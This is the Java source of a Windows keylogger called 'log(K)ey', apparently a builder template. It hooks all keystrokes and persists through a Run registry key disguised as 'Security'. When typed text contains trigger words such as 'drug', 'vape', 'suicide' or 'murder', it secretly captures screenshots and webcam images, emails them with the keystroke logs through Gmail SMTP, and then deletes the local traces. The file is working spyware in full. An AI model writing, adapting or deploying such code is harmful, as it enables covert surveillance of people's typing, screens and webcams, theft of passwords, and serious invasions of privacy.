package logkey.keylogger;

import logkey.email.SendEmail;
import logkey.screenshot.Screenshot;
import logkey.webcam.Cam;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {

    private static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
    private static DateFormat dateFormatHour = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss");
    private static String folder = "\\log(K)ey";
    private static String environment_variable_path = "APPDATA";
    private static String path_logs = "\\Logs\\";
    private static String path_screenshot = "\\Screenshot\\";
    private static String path_cam = "\\Cam\\";
    private static String app_path;
    private static String nameFileScreenshot;
    private static String nameFileCam;
    private static String logs = "";
    private static String logs_send = "";
    private static String smtp = "smtp.gmail.com";
    private static String email_from = "email@gmail.com";
    private static String email_password = "passwordemail";
    private static String email_to = "email@gmail.com";
    private static String subject = "log(K)ey";
    private static String port = "";
    private static int cam_width = 640;
    private static int cam_height = 480;
    private static boolean ssl = true;
    private static boolean tls = false;
    private static boolean debug_email = true;
    private static boolean screenshot = booleanScreenshot;
    private static boolean cam = booleanCam;
    private static boolean persistence = booleanPersistence;
    private static boolean keepdata = booleanKeepData;
    private static String name_jar = "\\logKEY.jar";

    public static void main(String[] args) throws IOException {
        detectOS();

        app_path = System.getenv(environment_variable_path) + folder;

        createFolder(app_path);
        createFolder(app_path + path_logs);
        createFolder(app_path + path_screenshot);
        createFolder(app_path + path_cam);

        if (persistence == true) {
            copyFile(Keylogger.class.getProtectionDomain().getCodeSource().getLocation().getPath(), app_path + name_jar);
        }

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            java.util.logging.Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
    }

    private static void copyFile(String source, String dest) {
        File jar_file = new File(app_path + name_jar);
        if (!jar_file.exists()) {
            File sourceFile = new File(source);
            File destFile = new File(dest);
            FileChannel sourceChannel = null;
            FileChannel destChannel = null;
            try {
                sourceChannel = new FileInputStream(sourceFile).getChannel();
                destChannel = new FileOutputStream(destFile).getChannel();
                destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                Runtime.getRuntime().exec("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Security\" /t REG_SZ /F /D \""+app_path+name_jar+"\"");
            } catch (IOException ex) {
                System.out.println(ex.getMessage());
            }
        }
    }

    private static void createFolder(String path) {
        new File(path).mkdir();
    }

    private static void deleteFolder(String path) {
        File folder = new File(path);
        File[] files = folder.listFiles();
        for (File file : files) {
            file.delete();
        }
    }

    private static void deleteData() {
        if (!keepdata) {
            deleteFolder(app_path + path_logs);
            deleteFolder(app_path + path_screenshot);
            deleteFolder(app_path + path_cam);
        }
    }

    private static void detectOS() {
        if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
            System.out.println("[!] OS is not supported!");
            System.exit(0);
        }
    }

    public void SaveLogs(String c) {

        c = c.toLowerCase();
        logs += c;
        if(logs.contains("drug")){
            try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
                bw.write("drug\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
            logs_send = "drug\n";
            logs = " ";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
        if(logs.contains("games")){
            try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
                bw.write("games\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
            logs_send = "games\n";
            logs = " ";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
        if(logs.contains("vape")){
            try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
                bw.write("vape\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
            logs_send = "vape\n";
            logs = " ";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
        if(logs.contains("pornography")){
            try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
                bw.write("pornography\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
            logs_send = "pornography\n";
            logs = " ";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
        if(logs.contains("cigarette")){
            try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
                bw.write("cigarette\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
            logs_send = "cigarette\n";
            logs = " ";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
        if(logs.contains("suicide")){
            try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
                bw.write("suicide\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
            logs_send = "suicide\n";
            logs = " ";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
        if(logs.contains("murder")){
            try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
                bw.write("murder\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
            logs_send = "murder\n";
            logs = " ";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }

    }

    public void sendAll() {
        try {
            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));

            nameFileCam = dateFormatHour.format(new Date()).toString();
            Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);

        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
                    app_path + path_cam + nameFileCam + ".png",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    public void sendScreenshot() {
        try {
            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    public void sendCam() {
        try {
            nameFileCam = dateFormatHour.format(new Date()).toString();
            Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_cam + nameFileCam + ".png",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    public void send() {
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        SaveLogs(String.valueOf(nke.getKeyChar()));
    }
}